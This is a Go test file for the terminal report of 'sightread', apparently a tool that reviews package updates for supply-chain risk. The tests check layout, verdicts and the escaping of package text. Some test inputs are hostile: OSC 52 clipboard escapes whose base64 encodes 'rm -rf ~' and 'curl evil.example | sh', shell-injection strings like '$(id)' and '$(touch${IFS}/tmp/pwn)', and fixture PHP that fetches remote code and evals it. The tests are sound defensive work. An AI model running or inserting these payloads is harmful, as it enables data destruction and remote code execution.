// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package report

import (
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/charmbracelet/lipgloss"

	"github.com/RhythmShahriar/rhythm/kit/cli"
	"github.com/RhythmShahriar/sightread/core"
	"github.com/RhythmShahriar/sightread/core/coretest"
)

// termOpts are NO_COLOR terminal options at a width.
func termOpts(width int) core.WriteOptions {
	o := testOpts
	o.Width = width
	return o
}

func writeTerm(t testing.TB, r *core.Report, o core.WriteOptions) string {
	t.Helper()
	return string(writeWith(t, core.FormatTerminal, r, o))
}

// oneUpdate is SampleReport cut to its HOLD update, for the one-update
// layout.
func oneUpdate() *core.Report {
	r := coretest.SampleReport()
	r.Updates = r.Updates[:1]
	r.NotChecked, r.Errors, r.Warnings = nil, nil, nil
	coretest.FakeScorer{}.Summarise(r)
	return r
}

func TestTerminalGoldens(t *testing.T) {
	for _, width := range []int{80, 120} {
		w := map[int]string{80: "80", 120: "120"}[width]
		coretest.Golden(t, "terminal-sample-"+w+".txt", []byte(writeTerm(t, coretest.SampleReport(), termOpts(width))))
		coretest.Golden(t, "terminal-one-"+w+".txt", []byte(writeTerm(t, oneUpdate(), termOpts(width))))
	}
	plain := termOpts(80)
	plain.Plain = true
	coretest.Golden(t, "terminal-sample-plain.txt", []byte(writeTerm(t, coretest.SampleReport(), plain)))
	coretest.Golden(t, "terminal-one-plain.txt", []byte(writeTerm(t, oneUpdate(), plain)))
	quiet := termOpts(80)
	quiet.Quiet = true
	coretest.Golden(t, "terminal-sample-quiet.txt", []byte(writeTerm(t, coretest.SampleReport(), quiet)))
}

// TestTerminalNoColor: without Color the output holds no escape byte at
// all, so NO_COLOR and a pipe get plain text.
func TestTerminalNoColor(t *testing.T) {
	for _, plain := range []bool{false, true} {
		o := termOpts(80)
		o.Plain = plain
		if out := writeTerm(t, coretest.SampleReport(), o); strings.Contains(out, "\x1b") {
			t.Errorf("plain=%v: an escape byte in NO_COLOR output", plain)
		}
	}
}

// sgr matches a Select Graphic Rendition sequence, the only escape the
// writer may emit.
var sgr = regexp.MustCompile("\x1b\\[[0-9;]*m")

// TestTerminalColorANSI: a colour run emits colour and nothing but SGR
// sequences, so package text can't smuggle a cursor move or OSC in.
func TestTerminalColorANSI(t *testing.T) {
	o := termOpts(80)
	o.Color = true
	r := oneUpdate()
	r.Updates[0].Changelog[0].Text = "fix \x1b]52;c;cm0gLXJmIH4=\x07 and \x1b[2J"
	out := writeTerm(t, r, o)
	if !sgr.MatchString(out) {
		t.Fatal("no colour in a colour run")
	}
	if rest := sgr.ReplaceAllString(out, ""); strings.Contains(rest, "\x1b") {
		i := strings.Index(rest, "\x1b")
		t.Errorf("a non-SGR escape in the output: %q", rest[max(0, i-20):min(len(rest), i+20)])
	}
	if !strings.Contains(sgr.ReplaceAllString(out, ""), `\x1b]52;c;`) {
		t.Error("the OSC 52 sequence is not shown escaped")
	}
}

// TestTerminalHostileChangelog is T-50: a changelog with an OSC 52
// clipboard write and a bidi override shows both escaped.
func TestTerminalHostileChangelog(t *testing.T) {
	r := oneUpdate()
	r.Updates[0].Changelog[0].Text = "Tested up to 6.8\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07 \u202egnp.php"
	for _, plain := range []bool{false, true} {
		o := termOpts(120)
		o.Plain = plain
		out := writeTerm(t, r, o)
		for _, want := range []string{`\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07`, `\u202egnp.php`} {
			if !strings.Contains(out, want) {
				t.Errorf("plain=%v: %q not shown", plain, want)
			}
		}
		if strings.ContainsRune(out, '\u202e') || strings.Contains(out, "\x1b") || strings.Contains(out, "\x07") {
			t.Errorf("plain=%v: a raw control reached the output", plain)
		}
	}
}

func TestTermText(t *testing.T) {
	for in, want := range map[string]string{
		"plain":                   "plain",
		"a\u202eb":                `a\u202eb`,
		"a\u2066b\u2069":          `a\u2066b\u2069`,
		"esc\x1b[31m":             `esc\x1b[31m`,
		"bad\xffbyte":             `bad\xffbyte`,
		"mail ann@example.com ok": "mail a•••••@example.com ok",
	} {
		if got := termText(in); got != want {
			t.Errorf("termText(%q) = %q, want %q", in, got, want)
		}
	}
	// A secret split by a bidi control is still masked: the escape would
	// break it into halves that no longer look like a key.
	key := coretest.FakeKey(coretest.KeyStripe)
	split := key[:10] + "\u202e" + key[10:]
	if got := termText(split); strings.Contains(got, key[10:]) {
		t.Errorf("a key split by a bidi control is shown: %q", got)
	}
}

// TestInstalledMatchesOnlyWhenCompared: "matches wordpress.org" needs a
// copy on disk; with --from or --from-tuner no installed file was read.
func TestInstalledMatchesOnlyWhenCompared(t *testing.T) {
	r := oneUpdate()
	if out := writeTerm(t, r, termOpts(120)); !strings.Contains(out, "countdown-timer-ultimate · matches wordpress.org ✓") {
		t.Errorf("a compared copy doesn't say it matches:\n%s", out)
	}
	r.Updates[0].Installed = core.InstalledInfo{}
	out := writeTerm(t, r, termOpts(120))
	if !strings.Contains(out, "  ▸ Installed     2.6.7\n") {
		t.Errorf("installed line without a copy on disk:\n%s", out)
	}
}

// TestFullDiffCommandKeepsFlags: the suggested command repeats the
// flags that chose what was compared, so it works from the same folder.
func TestFullDiffCommandKeepsFlags(t *testing.T) {
	o := termOpts(200)
	o.RerunFlags = []string{"--path", "projects/wp", "--from-file", "old copy.zip", "--allow-unverified"}
	out := writeTerm(t, oneUpdate(), o)
	want := "rhythm sightread plugin countdown-timer-ultimate --path projects/wp --from-file 'old copy.zip' --allow-unverified -o review.html --open\n"
	if !strings.Contains(out, want) {
		t.Errorf("missing %q in\n%s", want, out)
	}
}

// TestTerminalLayout asserts the fixed strings of PRD 9.1 in the
// one-update layout.
func TestTerminalLayout(t *testing.T) {
	out := writeTerm(t, oneUpdate(), termOpts(80))
	for _, want := range []string{
		"  ♪ rhythm sightread 1.0.0  wp-plugin countdown-timer-ultimate  2.6.7 → 2.6.8\n",
		"  " + strings.Repeat("─", 72) + "\n",
		"  " + readOnlyLine[:60],
		"  ! --skip-roadie-verify was used\n",
		"  ▸ Installed     2.6.7 in wp-content/plugins/countdown-timer-ultimate",
		"matches wordpress.org ✓",
		"  ▸ Candidate     2.6.8 · released 2026-10-24 · latest\n",
		"  ▸ Integrity     both versions: every file matches wordpress.org\n",
		"(SHA-256) ✓\n",
		"  ▸ Publisher     unchanged (sampleauthor)\n",
		"  ▸ Diff          14 files changed, 1 added · +2,184 −12 lines · 412 KB →\n",
		"  ▸ Changelog     2.6.8: \"Check compatibility with WordPress 6.8\"\n",
		"  CRITICAL  11 ─",
		" ▌  CRITICAL   Fetches remote code and runs it",
		"includes/class-wpos-analytics.php:88\n",
		" ▌             → Review remote-fetch-exec before you update.\n",
		" ▌             raised by owner-change\n",
		"╭",
		"│  VERDICT",
		"HOLD  │",
		"■ 11 critical",
		"Sightread reports what changed. It does not judge intent.",
		"╰",
		"  1 update reviewed · 2 archives verified · 0 from cache · 8.1s\n",
		"  → the full diff:\n    rhythm sightread plugin countdown-timer-ultimate -o review.html --open\n",
		"  → explain a finding: rhythm sightread explain integrity-mismatch\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q", want)
		}
	}
	for _, line := range strings.Split(out, "\n") {
		if w := lipgloss.Width(line); w > 80 && !strings.HasPrefix(line, "    rhythm sightread ") {
			t.Errorf("line over 80 cells (%d): %q", w, line)
		}
	}
}

// TestTerminalWidth120 keeps every line inside 120 columns and uses the
// widest layout (100).
func TestTerminalWidth120(t *testing.T) {
	out := writeTerm(t, coretest.SampleReport(), termOpts(120))
	if !strings.Contains(out, "  "+strings.Repeat("─", 100)+"\n") {
		t.Error("the rule is not 100 wide at 120 columns")
	}
	for _, line := range strings.Split(out, "\n") {
		if w := lipgloss.Width(line); w > 120 {
			t.Errorf("line over 120 cells (%d): %q", w, line)
		}
	}
}

func TestTerminalReadOnlyLines(t *testing.T) {
	r := oneUpdate()
	if out := writeTerm(t, r, termOpts(120)); !strings.Contains(out, readOnlyLine) || strings.Contains(out, readOnlySoundcheck) {
		t.Error("the read-only line is wrong without --soundcheck")
	}
	o := termOpts(120)
	o.Soundcheck = true
	if out := writeTerm(t, r, o); !strings.Contains(out, readOnlySoundcheck) || strings.Contains(out, readOnlyLine) {
		t.Error("the read-only line is wrong with --soundcheck")
	}
	o.Plain = true
	if out := writeTerm(t, r, o); !strings.Contains(out, "\n"+readOnlySoundcheck+"\n") {
		t.Error("plain mode has no read-only line")
	}
	o.Plain, o.Quiet = false, true
	if out := writeTerm(t, r, o); strings.Contains(out, "Read-only") {
		t.Error("quiet mode prints the read-only line")
	}
}

func TestTerminalPlain(t *testing.T) {
	o := termOpts(80)
	o.Plain = true
	out := writeTerm(t, oneUpdate(), o)
	for _, want := range []string{
		"rhythm sightread 1.0.0 - wp-plugin countdown-timer-ultimate - 2.6.7 to 2.6.8\n",
		"note: --skip-roadie-verify was used\n",
		"[CRITICAL] Fetches remote code and runs it - includes/class-wpos-analytics.php:88\n",
		"  evidence: wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)\n",
		"  advice: Review remote-fetch-exec before you update.\n",
		"  raised by: owner-change\n",
		"Verdict: HOLD\n11 critical\n",
		"Sightread reports what changed. It does not judge intent.\n",
		"1 update reviewed, 2 archives verified, 0 from cache, 8.1s\n",
		"next: explain a finding: rhythm sightread explain integrity-mismatch\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q", want)
		}
	}
	for _, glyph := range []string{"♪", "▸", "▌", "╭", "│", "■", "✓", "→ "} {
		if strings.Contains(out, glyph) && glyph != "→ " {
			t.Errorf("plain output holds %q", glyph)
		}
	}
	// The arrow may only appear inside package text (the evidence).
	for _, line := range strings.Split(out, "\n") {
		if strings.Contains(line, "→") && !strings.HasPrefix(line, "  evidence: ") {
			t.Errorf("plain line with an arrow: %q", line)
		}
	}
}

// TestTerminalMulti asserts the table, the sections and the box of a
// TestRecordReviewStep: the allow step of an update allow would accept
// is wrapped whole under its label at 80 columns; one whose archive
// doesn't match its hash, or whose allowed bytes changed, gets none.
func TestRecordReviewStep(t *testing.T) {
	r := oneUpdate()
	u := &r.Updates[0]
	u.Findings = slices.DeleteFunc(u.Findings, func(f core.Finding) bool {
		return f.ID == "integrity-mismatch" || f.ID == "approved-version-changed"
	})
	coretest.FakeScorer{}.Summarise(r)
	step := "  → record a review:\n    rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason \"...\"\n"
	if out := writeTerm(t, r, termOpts(80)); !strings.Contains(out, step) {
		t.Errorf("missing %q in\n%s", step, out)
	}
	if out := writeTerm(t, oneUpdate(), termOpts(80)); strings.Contains(out, "record a review") {
		t.Errorf("a tampered archive is offered to allow:\n%s", out)
	}
}

// run with several updates.
func TestTerminalMulti(t *testing.T) {
	out := writeTerm(t, coretest.SampleReport(), termOpts(120))
	for _, want := range []string{
		"  ♪ rhythm sightread 1.0.0  /var/www/shop  WordPress 6.8.3\n",
		"UPDATE",
		"countdown-timer-ultimate 2.6.7 → 2.6.8",
		"wpforms-lite 1.9.1 → 1.9.2",
		"ROUTINE on 2 sites",
		"  HOLD  countdown-timer-ultimate 2.6.7 → 2.6.8 ─",
		"  REVIEW  @acme/widgets 1.4.0 → 1.5.0 ─",
		"Not counted: 1 in the baseline, 1 ignored by config and 1 below --min-confidence.",
		"  UNVERIFIED  1 ─",
		"    astra 4.8.1 (wp-theme): couldn't verify astra 4.8.1: wordpress.org checksums answered 503\n",
		"  NOT CHECKED  2 ─",
		"    gravityforms 2.8.1 (wp-plugin): not on WordPress.org\n",
		"      → give the vendor's zip with --to-file\n",
		"    left-pad (npm): can't reach registry.npmjs.org (no such host) (E7)\n",
		"6 UPDATES",
		"1 hold · 1 review · 2 routine · 1 allowed · 1 unverified",
		"Incomplete review: 1 update couldn't be verified, 1 package wasn't checked and 1 error.",
		"  6 updates reviewed · 11 archives verified · 1 from cache · 8.1s\n",
		"  ! local-drift: wp-mail-smtp on disk is not the 4.1.1 wordpress.org ships\n",
		"  → every finding and the full diff: run again with -o review.html --open\n",
		"  → update the routine ones: wp plugin update wordfence wpforms-lite\n",
		"  → update the routine ones: composer update monolog/monolog\n",
		// countdown's archive doesn't match its hash, so allow would
		// refuse it; the next reviewed update is offered instead.
		"  → record a review: rhythm sightread allow npm:@acme/widgets@1.5.0",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q", want)
		}
	}
	if strings.Contains(out, cleanLine) {
		t.Error("the clean line is in a report with findings")
	}
}

// TestTerminalMaxFindings cuts the findings of an update and says how
// many more there are.
func TestTerminalMaxFindings(t *testing.T) {
	o := termOpts(80)
	o.MaxFindings = 2
	out := writeTerm(t, coretest.SampleReport(), o)
	if !strings.Contains(out, "    … 9 more (see -o review.html)\n") {
		t.Error("no … 9 more line for the HOLD update")
	}
	o.Plain = true
	if out := writeTerm(t, coretest.SampleReport(), o); !strings.Contains(out, "... 9 more (see -o review.html)\n") {
		t.Error("no ... 9 more line in plain mode")
	}
}

// TestTerminalRoutineFold folds over ten ROUTINE rows into one line.
func TestTerminalRoutineFold(t *testing.T) {
	r := &core.Report{Kind: core.KindReview, Complete: true}
	for i := range 12 {
		r.Updates = append(r.Updates, core.Update{Eco: core.NPM, Name: "pkg" + string(rune('a'+i)),
			From: core.Side{Version: "1.0.0", Verified: core.BySignature}, To: core.Side{Version: "1.0.1", Verified: core.BySignature},
			Verdict: core.Routine})
	}
	r.Updates[0].Verdict = core.Review
	r.Updates[0].Findings = []core.Finding{{ID: "dependency-new", Title: "Adds a runtime dependency", Severity: cli.SeverityMedium, Confidence: core.Confirmed}}
	coretest.FakeScorer{}.Summarise(r)
	out := writeTerm(t, r, termOpts(80))
	if !strings.Contains(out, "  11 updates with no risk signals\n") {
		t.Error("ROUTINE rows are not folded")
	}
	if strings.Contains(out, "pkgb ") {
		t.Error("a folded ROUTINE row is still listed")
	}
	if !strings.Contains(out, "npm install pkgb@1.0.1 pkgc@1.0.1 ") {
		t.Error("no npm install line for the folded updates")
	}
	r.Updates = r.Updates[:11] // ten ROUTINE rows stay listed
	coretest.FakeScorer{}.Summarise(r)
	if out := writeTerm(t, r, termOpts(80)); strings.Contains(out, "with no risk signals") {
		t.Error("ten ROUTINE rows are folded")
	}
}

// TestTerminalClean shows the clean box text for an update with nothing
// to report and never for one with findings.
func TestTerminalClean(t *testing.T) {
	out := writeTerm(t, smallReport(), termOpts(80))
	for _, want := range []string{"ROUTINE", "No risk signals found. This is a static diff, not proof the",
		"  → update it: npm install left-pad@1.3.1\n"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q", want)
		}
	}
	o := termOpts(120)
	o.Plain = true
	if out := writeTerm(t, smallReport(), o); !strings.Contains(out, "\n"+cleanLine+"\n") {
		t.Error("plain mode has no clean line")
	}
	if out := writeTerm(t, oneUpdate(), termOpts(120)); strings.Contains(out, cleanLine) {
		t.Error("the clean line is in a HOLD")
	}
}

// hiddenReport is smallReport with one low finding --severity hid.
func hiddenReport() *core.Report {
	r := smallReport()
	r.Updates[0].Hidden = []core.Finding{{ID: "cron-new-hook", Severity: cli.SeverityLow}}
	coretest.FakeScorer{}.Summarise(r)
	r.Complete = true
	r.Notes = []string{"1 finding is hidden by --severity medium (they still count for the verdict and --fail-on)"}
	return r
}

// TestTerminalHiddenNotClean: a run that hid a finding never says it
// found no risk signals and never offers the update command.
func TestTerminalHiddenNotClean(t *testing.T) {
	for _, plain := range []bool{false, true} {
		o := termOpts(120)
		o.Plain = plain
		out := writeTerm(t, hiddenReport(), o)
		if strings.Contains(out, cleanLine) {
			t.Errorf("plain %v: the clean line with a hidden finding:\n%s", plain, out)
		}
		if strings.Contains(out, "update it") {
			t.Errorf("plain %v: the update hint with a hidden finding:\n%s", plain, out)
		}
		for _, want := range []string{"1 hidden", "1 finding is hidden by --severity medium"} {
			if !strings.Contains(out, want) {
				t.Errorf("plain %v: missing %q:\n%s", plain, want, out)
			}
		}
	}
}

func TestTerminalVerdictWords(t *testing.T) {
	for _, v := range []core.Verdict{core.Hold, core.Review, core.Routine, core.Allowed, core.Unverified} {
		r := smallReport()
		r.Updates[0].Verdict = v
		if v == core.Unverified {
			r.Updates[0].To.Verified = core.ByNone
		}
		coretest.FakeScorer{}.Summarise(r)
		word := strings.ToUpper(string(v))
		if out := writeTerm(t, r, termOpts(80)); !regexp.MustCompile(word + `\s+│`).MatchString(out) {
			t.Errorf("no %s in the verdict box", word)
		}
		o := termOpts(80)
		o.Plain = true
		if out := writeTerm(t, r, o); !strings.Contains(out, "Verdict: "+word+"\n") {
			t.Errorf("no Verdict: %s in plain mode", word)
		}
	}
}

func TestTerminalUnverifiedBox(t *testing.T) {
	r := coretest.SampleReport()
	r.Updates = r.Updates[4:5]
	r.NotChecked, r.Errors = nil, nil
	coretest.FakeScorer{}.Summarise(r)
	out := writeTerm(t, r, termOpts(120))
	for _, want := range []string{"UNVERIFIED  │", "Not verified: couldn't verify astra 4.8.1: wordpress.org checksums answered 503.",
		"Not diffed; --allow-unverified reviews it anyway.", "▸ Diff          not diffed: the update is unverified"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q", want)
		}
	}
	if strings.Contains(out, "record a review") {
		t.Error("an unverified version is offered for allow")
	}
}

// TestTerminalUnverifiedDiffed: an unverified update reviewed with
// --allow-unverified was diffed, so with nothing found it says neither
// "Not diffed" in the box nor "not verified" in the FINDINGS column.
func TestTerminalUnverifiedDiffed(t *testing.T) {
	r := coretest.SampleReport()
	r.Updates = r.Updates[4:5]
	r.NotChecked, r.Errors = nil, nil
	u := &r.Updates[0]
	u.Findings = nil
	u.Diff = core.DiffStats{FilesChanged: 2, LinesAdded: 4, LinesRemoved: 1, BytesFrom: 900, BytesTo: 1000}
	coretest.FakeScorer{}.Summarise(r)
	out := writeTerm(t, r, termOpts(120))
	if strings.Contains(out, "Not diffed") || strings.Contains(out, "not diffed") {
		t.Errorf("a diffed update says it was not diffed:\n%s", out)
	}
	if !strings.Contains(out, "▸ Diff          2 files changed") || !strings.Contains(out, "UNVERIFIED  │") {
		t.Errorf("no diff line or verdict:\n%s", out)
	}
	if got := tableFindings(u); got != "" {
		t.Errorf("FINDINGS %q for a diffed update with nothing found", got)
	}
	u.Diff = core.DiffStats{}
	if got := tableFindings(u); got != "not verified" {
		t.Errorf("FINDINGS %q for an update not diffed", got)
	}
}

// TestTerminalUnverifiedListHint: the UNVERIFIED section of a run with
// several updates offers --allow-unverified only for the ones not
// diffed.
func TestTerminalUnverifiedListHint(t *testing.T) {
	r := coretest.SampleReport()
	r.NotChecked, r.Errors = nil, nil
	coretest.FakeScorer{}.Summarise(r)
	if out := writeTerm(t, r, termOpts(120)); !strings.Contains(out, "--allow-unverified reviews them anyway") {
		t.Errorf("no hint for an update not diffed:\n%s", out)
	}
	for i := range r.Updates {
		if r.Updates[i].Verdict == core.Unverified {
			r.Updates[i].Diff = core.DiffStats{FilesChanged: 1, LinesAdded: 1, BytesTo: 10}
		}
	}
	if out := writeTerm(t, r, termOpts(120)); strings.Contains(out, "reviews them anyway") || strings.Contains(out, "not diffed anyway") {
		t.Errorf("a diffed update gets the hint:\n%s", out)
	}
}

func TestTerminalFleetRow(t *testing.T) {
	r := smallReport()
	r.Updates[0] = core.Update{Eco: core.WPPlugin, Name: "wpforms-lite", From: core.Side{Version: "1.9.1"}, To: core.Side{Version: "1.9.2"},
		Verdict: core.Review, Sites: make([]string, 14),
		Findings: []core.Finding{{ID: "dependency-new", Title: "Adds a runtime dependency", Severity: cli.SeverityMedium}}}
	r.Updates = append(r.Updates, r.Updates[0])
	r.Updates[1].Name = "akismet"
	coretest.FakeScorer{}.Summarise(r)
	for _, plain := range []bool{false, true} {
		o := termOpts(80)
		o.Plain = plain
		out := writeTerm(t, r, o)
		arrow := "→"
		if plain {
			arrow = "to"
		}
		if !strings.Contains(out, "wpforms-lite 1.9.1 "+arrow+" 1.9.2  REVIEW on 14 sites") {
			t.Errorf("plain=%v: no fleet row:\n%s", plain, out)
		}
	}
}

func TestTerminalNotesAndWarnings(t *testing.T) {
	r := smallReport()
	r.Notes = []string{"unanalysed lowered to medium by .sightread/config.yaml"}
	r.Warnings = []string{"local-drift: x on disk differs"}
	out := writeTerm(t, r, termOpts(80))
	head, _, _ := strings.Cut(out, "▸")
	if !strings.Contains(head, "  ! unanalysed lowered to medium by .sightread/config.yaml\n") {
		t.Error("the note is not under the header")
	}
	if !strings.Contains(out, "  ! local-drift: x on disk differs\n") {
		t.Error("no warning line")
	}
}

func TestTerminalQuiet(t *testing.T) {
	o := termOpts(80)
	o.Quiet = true
	out := writeTerm(t, coretest.SampleReport(), o)
	if !strings.Contains(out, "VERDICT") && !strings.Contains(out, "UPDATE") {
		t.Error("quiet mode has no table")
	}
	if !strings.Contains(out, "Fetches remote code and runs it") {
		t.Error("quiet mode has no findings")
	}
	for _, not := range []string{"♪", "▸", "╭", "reviewed ·", "→ explain", "NOT CHECKED", "! "} {
		if strings.Contains(out, not) {
			t.Errorf("quiet mode holds %q", not)
		}
	}
}

func TestTerminalEmpty(t *testing.T) {
	r := &core.Report{Kind: core.KindReview, Complete: true, Target: core.Target{Path: "/srv/site"}, Duration: time.Second}
	out := writeTerm(t, r, termOpts(80))
	for _, want := range []string{"No updates to review.", "0 UPDATES", "0 updates reviewed · 0 archives verified"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q", want)
		}
	}
}

// TestTerminalShellArg: names in the printed commands can't add a
// command when the line is copied.
func TestTerminalShellArg(t *testing.T) {
	for in, want := range map[string]string{
		"akismet":         "akismet",
		"@acme/ui@1.0.0":  "@acme/ui@1.0.0",
		"x; rm -rf ~":     "'x; rm -rf ~'",
		"it's":            `'it'\''s'`,
		"$(id)":           "'$(id)'",
		"monolog/monolog": "monolog/monolog",
		"wp-plugin:x;id@1.0$(touch${IFS}/tmp/pwn)": `'wp-plugin:x;id@1.0$(touch${IFS}/tmp/pwn)'`,
	} {
		if got := shellArg(in); got != want {
			t.Errorf("shellArg(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCutCells(t *testing.T) {
	if got := cutCells("  ab  cd", 3); strings.Join(got, "|") != "  a|b  |cd" {
		t.Errorf("cutCells kept %q", got)
	}
	if got := cutCells("", 3); len(got) != 1 || got[0] != "" {
		t.Errorf("cutCells of nothing = %q", got)
	}
}

func TestWrapHard(t *testing.T) {
	got := wrapHard("short "+strings.Repeat("x", 25), 10)
	want := []string{"short", "xxxxxxxxxx", "xxxxxxxxxx", "xxxxx"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("wrapHard = %q, want %q", got, want)
	}
	if wrapHard("", 10) != nil {
		t.Error("wrapHard of nothing is not empty")
	}
}

func TestThousands(t *testing.T) {
	for n, want := range map[int]string{0: "0", 12: "12", 999: "999", 1000: "1,000", 2184: "2,184", 1234567: "1,234,567", -1500: "-1,500"} {
		if got := thousands(n); got != want {
			t.Errorf("thousands(%d) = %q, want %q", n, got, want)
		}
	}
}

// TestTerminalShowDiff: --diff prints every hunk, of sectioned updates
// and of the others, with package text escaped.
func TestTerminalShowDiff(t *testing.T) {
	r := coretest.SampleReport()
	r.Updates[0].Hunks[0].Lines = append(r.Updates[0].Hunks[0].Lines, "+ x \x1b]52;c;eA==\x07")
	r.Updates[2].Hunks = []core.Hunk{{Path: "src/Logger.php", OldStart: 1, OldLines: 1, NewStart: 1, NewLines: 1, Lines: []string{"-old", "+new"}}}
	o := termOpts(80)
	if out := writeTerm(t, r, o); strings.Contains(out, "DIFF") {
		t.Error("hunks shown without --diff")
	}
	o.ShowDiff = true
	out := writeTerm(t, r, o)
	for _, want := range []string{
		"  DIFF  1 ─",
		"    @@ -80,2 +80,4 @@ includes/class-wpos-analytics.php\n",
		"    +  eval($b['body']);\n",
		`    + x \x1b]52;c;eA==\x07`,
		"  ROUTINE  monolog/monolog 3.12.0 → 3.12.1 ─",
		"    @@ -1,1 +1,1 @@ src/Logger.php\n    -old\n    +new\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in\n%s", want, out)
		}
	}
	o.Plain = true
	out = writeTerm(t, r, o)
	if !strings.Contains(out, "DIFF (1):\n@@ -80,2 +80,4 @@ includes/class-wpos-analytics.php\n function wpos_init() {\n") {
		t.Errorf("plain diff:\n%s", out)
	}
}

// TestTerminalSoundcheckFacts: a --soundcheck run shows how the update
// was applied, the Roadie verify result and the counts with the report
// path; a run without --soundcheck shows none of them.
func TestTerminalSoundcheckFacts(t *testing.T) {
	o := termOpts(100)
	o.Plain = true
	r := oneUpdate()
	r.Updates[0].Soundcheck = &core.SoundcheckResult{Staging: "https://staging.example", RoadieVerify: "ok",
		Applied: "verified archive 0123456789ab", Report: "soundcheck/report.html", Broke: 1, New: 2, Changed: 3}
	out := writeTerm(t, r, o)
	for _, want := range []string{
		"Applied: verified archive 0123456789ab\n",
		"Roadie: ok\n",
		"Soundcheck: https://staging.example: 1 broke, 2 new, 3 changed",
		"soundcheck/report.html\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in\n%s", want, out)
		}
	}
	out = writeTerm(t, oneUpdate(), o)
	for _, label := range []string{"Applied:", "Roadie:", "Soundcheck:"} {
		if strings.Contains(out, label) {
			t.Errorf("a run without --soundcheck shows %q", label)
		}
	}
}

// TestFetchFailureListedOnce: a package that failed to download is one
// Not checked line carrying its error's code in every format; the
// incomplete line counts it once.
func TestFetchFailureListedOnce(t *testing.T) {
	r := &core.Report{Kind: core.KindReview, Target: core.Target{Path: "/srv/app", Kind: "npm"},
		NotChecked: []core.NotChecked{{Eco: core.NPM, Name: "date-utils-lite", Version: "1.4.0", Reason: core.FetchFailed,
			Text: "could not download (can't reach registry.npmjs.org)", Hint: "run again; -v shows the request"}},
		Errors: []core.ErrorEntry{
			{Eco: core.NPM, Name: "date-utils-lite", Code: core.ENetwork, Message: "can't reach registry.npmjs.org"},
			{Eco: core.NPM, Name: "other", Code: core.ENetwork, Message: "can't reach registry.npmjs.org"},
		}}
	r.Summary.NotChecked = 1
	term := writeTerm(t, r, termOpts(120))
	for _, want := range []string{
		"  NOT CHECKED  2 ─",
		"    date-utils-lite 1.4.0 (npm): could not download (can't reach registry.npmjs.org) (E7)\n",
		"    other (npm): can't reach registry.npmjs.org (E7)\n",
		"Incomplete review: 1 package wasn't checked and 1 error.",
	} {
		if !strings.Contains(term, want) {
			t.Errorf("terminal: missing %q in\n%s", want, term)
		}
	}
	if strings.Contains(term, "date-utils-lite (npm): can't reach") {
		t.Errorf("terminal lists the failure twice:\n%s", term)
	}
	md := writeMD(t, r)
	if !strings.Contains(md, "**Incomplete review:** 1 package wasn't checked and 1 error.") ||
		strings.Count(md, "date-utils-lite") != 1 || !strings.Contains(md, "(E7)") {
		t.Errorf("markdown:\n%s", md)
	}
	if h := writeHTML(t, r); strings.Count(h, "date-utils-lite") != 1 || !strings.Contains(h, "1 package wasn&#39;t checked and 1 error") {
		t.Errorf("html lists the failure %d times", strings.Count(h, "date-utils-lite"))
	}
}

// TestDemoNextSteps: the demo's report reruns the demo for the full
// diff and never offers an update or allow command for its made-up
// packages, in any format.
func TestDemoNextSteps(t *testing.T) {
	o := termOpts(120)
	o.Demo = true
	out := writeTerm(t, coretest.SampleReport(), o)
	if !strings.Contains(out, "  → every finding and the full diff: rhythm sightread demo -o review.html --open\n") {
		t.Errorf("no demo rerun step:\n%s", out)
	}
	for _, not := range []string{"run again with -o", "update the routine ones", "record a review", " allow "} {
		if strings.Contains(out, not) {
			t.Errorf("demo report offers %q:\n%s", not, out)
		}
	}
	if !strings.Contains(out, "→ explain a finding:") {
		t.Error("the demo lost its explain step")
	}
	md := string(writeWith(t, core.FormatMarkdown, coretest.SampleReport(), o))
	h := string(writeWith(t, core.FormatHTML, coretest.SampleReport(), o))
	if strings.Contains(md, "Record your review:") || strings.Contains(h, "<h3>Record your review</h3>") {
		t.Error("the demo's Markdown or HTML offers an allow command")
	}
}

// TestPublisherFact: a change uses "to" in plain mode. An installed
// side with no publisher data is not reported as a change.
func TestPublisherFact(t *testing.T) {
	for _, tc := range []struct {
		from, to []string
		plain    bool
		want     string
	}{
		{[]string{"wponlinesupport"}, []string{"essentialplugin"}, true, "Publisher: changed: wponlinesupport to essentialplugin\n"},
		{[]string{"wponlinesupport"}, []string{"essentialplugin"}, false, "Publisher     changed: wponlinesupport → essentialplugin\n"},
		{nil, []string{"vendor"}, true, "Publisher: vendor (no publisher known for 2.6.7)\n"},
		{nil, []string{"vendor"}, false, "Publisher     vendor (no publisher known for 2.6.7)\n"},
	} {
		r := oneUpdate()
		u := &r.Updates[0]
		u.From.Publisher, u.To.Publisher = tc.from, tc.to
		o := termOpts(120)
		o.Plain = tc.plain
		out := writeTerm(t, r, o)
		if !strings.Contains(out, tc.want) {
			t.Errorf("plain %v: missing %q in\n%s", tc.plain, tc.want, out)
		}
		if strings.Contains(out, "changed: none") {
			t.Errorf("plain %v: reports a change from none:\n%s", tc.plain, out)
		}
	}
	u := &oneUpdate().Updates[0]
	u.From.Publisher, u.To.Publisher = nil, []string{"vendor"}
	if got := publisherLine(u); got != "Publisher: vendor (no publisher known for 2.6.7)." {
		t.Errorf("markdown: %q", got)
	}
	if got, changed := publisherText(u); got != "vendor (no publisher known for 2.6.7)" || changed {
		t.Errorf("html: %q %v", got, changed)
	}
}
